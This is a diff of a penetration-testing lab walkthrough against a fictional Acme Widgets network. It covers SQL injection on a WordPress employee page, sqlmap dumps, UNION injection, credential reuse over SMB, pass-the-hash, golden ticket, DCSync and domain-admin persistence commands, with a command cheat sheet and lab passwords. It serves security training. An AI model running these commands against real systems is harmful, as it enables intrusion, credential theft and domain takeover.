@@ -86,8 +86,8 @@ nmap -sV -sC 172.16.0.100
 - `-p-`: Scan all 65535 ports (not just common ones)
 
 **Expected result:** You should see:
-- Port 80 (HTTP) - Apache/nginx web server
-- Port 3306 (MySQL) - Database (likely firewalled but detected)
+- Port 22 (SSH) - OpenSSH server
+- Port 80 (HTTP) - Apache web server
 
 ---
 
@@ -120,62 +120,69 @@ gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
 
 **What you're doing:** Brute-forcing common directory names to find hidden content.
 
-**Look for:** The `/employee-directory/` page - this is Acme's internal employee portal.
+**Look for:** WordPress directories like `/wp-admin/`, `/wp-content/`, and `/wp-includes/`. The Employee Directory is a WordPress page.
 
-### 2.3 Testing for SQL Injection
+### 2.3 Finding the Employee Directory
 
-Navigate to the Employee Directory page:
-```
-http://172.16.0.100/employee-directory/
-```
-
-You'll see a search box. Let's test if it's vulnerable to SQL injection.
+The Employee Directory is a WordPress page. You can find it by:
 
 ```bash
-# Test with a single quote to see if we get an error
-curl "http://172.16.0.100/employee-directory/?search='"
+# Check the WordPress site for pages
+curl -s "http://172.16.0.100/" | grep -i "employee"
 ```
 
-**What you're doing:** The single quote (`'`) breaks SQL syntax if input isn't sanitized. If the app is vulnerable, you'll see an error or unexpected behavior.
+Or browse to the site and look for links. The Employee Directory is at:
+```
+http://172.16.0.100/?page_id=4
+```
 
-### 2.4 Confirming SQL Injection
+You'll see a table of employees with a search box, and links to view individual employee details.
 
-Try a boolean-based test:
+### 2.4 Testing for SQL Injection
+
+The page has two potential injection points:
+1. The `search` parameter (search box)
+2. The `employee_id` parameter (employee detail links)
+
+Let's test the `employee_id` parameter - it's a numeric field which is often easier to exploit:
 
 ```bash
-# This should return results (always true)
-curl "http://172.16.0.100/employee-directory/?search=' OR '1'='1"
+# Normal request - shows employee details
+curl -s "http://172.16.0.100/?page_id=4&employee_id=1" | grep -i "john\|smith"
 
-# This should return nothing (always false)
-curl "http://172.16.0.100/employee-directory/?search=' AND '1'='2"
+# Test with a simple boolean injection
+curl -s "http://172.16.0.100/?page_id=4&employee_id=1 AND 1=1" | grep -i "john"
+
+# This should return nothing (false condition)
+curl -s "http://172.16.0.100/?page_id=4&employee_id=1 AND 1=2" | grep -i "john"
 ```
 
 **Understanding the attack:**
-- The search query becomes: `WHERE name LIKE '%' OR '1'='1%'`
-- Since `'1'='1'` is always true, it returns all records
-- This confirms the application is vulnerable to SQL injection
+- The query becomes: `WHERE id = 1 AND 1=1` (true - returns data)
+- vs: `WHERE id = 1 AND 1=2` (false - returns nothing)
+- Different responses confirm SQL injection vulnerability
 
 ### 2.5 Extracting Data with SQLMap
 
 Now let's use sqlmap to automate the extraction:
 
 ```bash
-# Let sqlmap identify the vulnerability
-sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --batch
+# Let sqlmap identify the vulnerability on employee_id parameter
+sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id --batch
 ```
 
-**What `--batch` does:** Accepts default answers to all prompts (useful for automation).
+**What `-p employee_id` does:** Tells sqlmap to focus on the employee_id parameter.
 
 Once confirmed, let's enumerate the database:
 
 ```bash
 # List all databases
-sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --dbs --batch
+sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id --dbs --batch
 ```
 
 ```bash
 # List tables in the WordPress database
-sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress --tables --batch
+sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordpress --tables --batch
 ```
 
 **Expected result:** You should see a table called `wp_acme_employees`.
@@ -184,7 +191,7 @@ sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress --t
 
 ```bash
 # Dump the employee table
-sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress -T wp_acme_employees --dump --batch
+sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordpress -T wp_acme_employees --dump --batch
 ```
 
 **CRITICAL FINDING:** The output reveals VPN credentials stored in plaintext:
@@ -376,25 +383,36 @@ The format is: `username:RID:LM_hash:NTLM_hash:::`
 - They can be cracked offline to reveal plaintext passwords
 - The `krbtgt` hash allows Golden Ticket attacks
 
-### 5.4 Pass-the-Hash Attack
+### 5.4 Verifying Domain Admin Access
 
-You don't even need to crack the password. Use the hash directly:
+**Important Note:** This lab uses Samba 4 AD (Linux-based) rather than Windows Server. Some Windows-specific tools won't work:
+- `impacket-psexec` - Requires Windows Service Control Manager
+- `impacket-wmiexec` - Requires Windows WMI service
+
+Instead, verify your Domain Admin access via SMB:
 
 ```bash
-# Use the Administrator's NTLM hash to get a shell
-impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@172.16.2.12
+# List shares on the Domain Controller with Domain Admin credentials
+smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024!'
+
+# Access the SYSVOL share (only Domain Admins can write here)
+smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
 ```
 
-**Alternative:** If DCSync failed on Samba, use the plaintext password from passwords.txt:
+You can also verify via LDAP:
 ```bash
-# Direct authentication with Domain Admin credentials
-impacket-psexec 'Administrator:Adm1n2024!@172.16.2.12'
-
-# Or use wmiexec for a lighter footprint
-impacket-wmiexec 'Administrator:Adm1n2024!@172.16.2.12'
+# Query domain users as Domain Admin
+ldapsearch -x -H ldap://172.16.2.12 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
+  -w 'Adm1n2024!' -b 'DC=acmewidgets,DC=local' '(objectClass=user)' cn -ZZ
 ```
 
 **You now have Domain Admin access!**
+
+**In a real Windows environment**, you would use Pass-the-Hash:
+```bash
+# Use the Administrator's NTLM hash to get a shell (Windows AD only)
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@<DC_IP>
+```
 
 ---
 
@@ -402,34 +420,46 @@ impacket-wmiexec 'Administrator:Adm1n2024!@172.16.2.12'
 
 ### 6.1 Verify Your Access
 
+Since this is a Samba-based AD (Linux), we verify access via SMB and LDAP rather than Windows commands:
+
 ```bash
-# On the DC, verify you're Administrator
-whoami
-whoami /groups
+# Verify you can access privileged shares
+smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
+
+# List all files in the domain SYSVOL
+smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'recurse; ls'
 ```
 
 ### 6.2 Explore the Domain
 
+Use LDAP or Samba tools to enumerate the domain:
+
 ```bash
-# List all domain users
-net user /domain
+# List all domain users (via samba-tool if you have shell access)
+# Or enumerate via LDAP from Kali:
+ldapsearch -x -H ldap://172.16.2.12 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
+  -w 'Adm1n2024!' -b 'cn=Users,DC=acmewidgets,DC=local' '(objectClass=user)' sAMAccountName -ZZ
 
-# List all domain admins
-net group "Domain Admins" /domain
-
-# List all computers
-net group "Domain Computers" /domain
+# Check group memberships
+ldapsearch -x -H ldap://172.16.2.12 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
+  -w 'Adm1n2024!' -b 'DC=acmewidgets,DC=local' '(cn=Domain Admins)' member -ZZ
 ```
 
 ### 6.3 Create Persistence (For Education Only)
 
 **WARNING:** In real engagements, only create persistence if explicitly authorized.
 
+In a Windows AD environment, you would:
 ```bash
-# Create a new domain admin (for persistence)
+# Create a new domain admin (Windows AD only)
 net user hacker P@ssw0rd /add /domain
 net group "Domain Admins" hacker /add /domain
 ```
+
+In this Samba lab, persistence could be achieved by:
+- Adding SSH keys to the DC
+- Creating a new domain user via LDAP
+- Modifying SYSVOL scripts
 
 ---
 
@@ -440,19 +470,19 @@ Here's the complete attack chain you executed:
 ```
 1. RECONNAISSANCE
    └── Network scanning with nmap
-       └── Found webserver at 172.16.0.100
+       └── Found webserver at 172.16.0.100 (ports 22, 80)
 
 2. WEB APPLICATION ATTACK
-   └── Discovered WordPress Employee Directory
-       └── SQL Injection vulnerability
-           └── Extracted plaintext credentials:
+   └── Discovered WordPress Employee Directory (?page_id=4)
+       └── SQL Injection in employee_id parameter
+           └── Extracted plaintext VPN credentials:
                - jsmith / Summer2024
                - mwilliams / Welcome123
                - svc_backup / Backup2024!
 
 3. LATERAL MOVEMENT
    └── Credential reuse on file server (172.16.2.10)
-       └── Accessed "sensitive" SMB share with Impacket
+       └── svc_backup can access "sensitive" SMB share
            └── Found Domain Admin password in passwords.txt
 
 4. BROWSER EXPLOITATION (Alternative Path)
@@ -460,13 +490,13 @@ Here's the complete attack chain you executed:
        └── BeEF hook captured employee browser
            └── Social engineering / internal network access
 
-5. ACTIVE DIRECTORY ATTACK
-   └── DCSync attack using svc_backup credentials
-       └── Extracted all domain password hashes
-           └── Pass-the-Hash to Domain Admin
+5. DOMAIN COMPROMISE
+   └── Used Domain Admin credentials from passwords.txt
+       └── Authenticated to DC01 SYSVOL share
+           └── Full administrative access to acmewidgets.local
 
-6. DOMAIN COMPROMISE
-   └── Full administrative access to acmewidgets.local
+Note: DCSync has limited support on Samba 4 AD. In a Windows AD environment,
+you could also use svc_backup's DCSync rights to extract password hashes.
 ```
 
 ---
@@ -512,21 +542,32 @@ Here's the complete attack chain you executed:
 ## Additional Exercises
 
 ### Exercise 1: Manual SQL Injection
-Instead of using sqlmap, try to extract data manually using UNION-based injection.
+Instead of using sqlmap, try to extract data manually using UNION-based injection:
+```bash
+# Find the number of columns (try increasing until no error)
+curl "http://172.16.0.100/?page_id=4&employee_id=1 ORDER BY 10-- -"
+
+# Extract data with UNION
+curl "http://172.16.0.100/?page_id=4&employee_id=-1 UNION SELECT 1,2,3,vpn_username,vpn_password,6,7,8,9,10 FROM wp_acme_employees-- -"
+```
 
 ### Exercise 2: Password Cracking
-Use hashcat or john to crack the NTLM hashes you extracted:
+If you obtained NTLM hashes (from a Windows AD), crack them with hashcat:
 ```bash
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-### Exercise 3: Golden Ticket
+### Exercise 3: Golden Ticket (Windows AD only)
+**Note:** This exercise requires a Windows-based AD. Samba 4 has limited Kerberos ticket support.
+
 Using the `krbtgt` hash from DCSync, create a Golden Ticket for persistent access:
 ```bash
 impacket-ticketer -domain acmewidgets.local -domain-sid <SID> -krbtgt <HASH> Administrator
 ```
 
 ### Exercise 4: BloodHound Analysis
+**Note:** BloodHound works best with Windows AD. Results may be limited on Samba 4.
+
 Run BloodHound to visualize the attack paths:
 ```bash
 bloodhound-python -u svc_backup -p 'Backup2024!' -d acmewidgets.local -ns 172.16.2.12
@@ -538,24 +579,30 @@ bloodhound-python -u svc_backup -p 'Backup2024!' -d acmewidgets.local -ns 172.16
 
 ```bash
 # Network scanning
-nmap -sn 172.16.1.0/24                    # Host discovery
-nmap -sV -sC -p- <IP>                     # Full port scan
+nmap -sn 172.16.0.0/24                    # Host discovery (internet segment)
+nmap -sn 172.16.2.0/24                    # Host discovery (internal segment)
+nmap -sV -sC <IP>                         # Service scan with scripts
 
-# SQL Injection
-sqlmap -u "<URL>" --dbs                    # List databases
-sqlmap -u "<URL>" -D <db> --tables         # List tables
-sqlmap -u "<URL>" -D <db> -T <tbl> --dump  # Dump table
+# SQL Injection (this lab)
+sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id --dbs --batch
+sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordpress --tables --batch
+sqlmap -u "http://172.16.0.100/?page_id=4&employee_id=1" -p employee_id -D wordpress -T wp_acme_employees --dump --batch
 
-# SMB with Impacket
-impacket-smbclient '<user>:<pass>@<IP>'               # Interactive SMB
+# SMB with smbclient
+smbclient -L //<IP> -U '<user>%<pass>'              # List shares
+smbclient //<IP>/<share> -U '<user>%<pass>' -c 'ls' # List files
+smbclient //<IP>/<share> -U '<user>%<pass>' -c 'get <file> -'  # Download file
+
+# SMB with Impacket (alternative)
+impacket-smbclient '<user>:<pass>@<IP>'             # Interactive SMB
 # Inside: shares, use <share>, ls, cat <file>, get <file>
 
 # Active Directory with Impacket
-impacket-secretsdump '<domain>/<user>:<pass>@<DC>'    # DCSync
-impacket-psexec '<user>:<pass>@<IP>'                  # Remote shell via SMB
-impacket-psexec -hashes <LM>:<NTLM> <user>@<IP>       # Pass-the-Hash
-impacket-wmiexec '<user>:<pass>@<IP>'                 # Remote shell via WMI
-impacket-atexec '<user>:<pass>@<IP>' <command>        # Remote command via Task Scheduler
+impacket-secretsdump '<domain>/<user>:<pass>@<DC>'  # DCSync (limited on Samba)
+
+# Windows AD only (won't work on Samba):
+# impacket-psexec '<user>:<pass>@<IP>'              # Remote shell via SMB
+# impacket-wmiexec '<user>:<pass>@<IP>'             # Remote shell via WMI
 
 # BeEF
 beef-xss                                   # Start BeEF
